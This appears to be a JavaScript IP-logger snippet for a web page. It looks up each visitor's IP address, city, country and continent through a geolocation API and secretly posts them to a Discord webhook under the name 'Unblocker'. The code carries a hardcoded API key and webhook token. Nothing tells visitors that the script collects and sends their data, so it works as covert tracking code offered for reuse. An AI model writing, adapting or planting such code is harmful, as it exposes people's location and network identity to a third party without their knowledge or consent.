$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=9277bd429d1441fe88f1a1ed2f13a72a", function(data) { //Make sure to use this api or use another but you got to change the values down below
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/969338746656927794/o_TzhGM3lARXArgiCZB_14kJyl0AGLRhIJaodgl7kg22Dw50a_7tj-8KkDPTxsbDfcsV");
  
    request.setRequestHeader('Content-type', 'application/json');
    var t = {
      username: "Unblocker",
      avatar_url: "https://www.origo.hu/i/1305/20130509-fogonosz-semion-mogilevich-orosz-maffiozo.jpg",
      content: "",
      embeds: [{
          color: "4700374",
          title: "szia lajos",
          fields: [
            {name: "Ip", value: data.query},
            {name: "City", value: data.city},
            {name: "Country", value: data.country},
            {name: "CONTINENT", value: data.continent},
          ],
         
      }]
  };
  
    request.send(JSON.stringify(t));
})
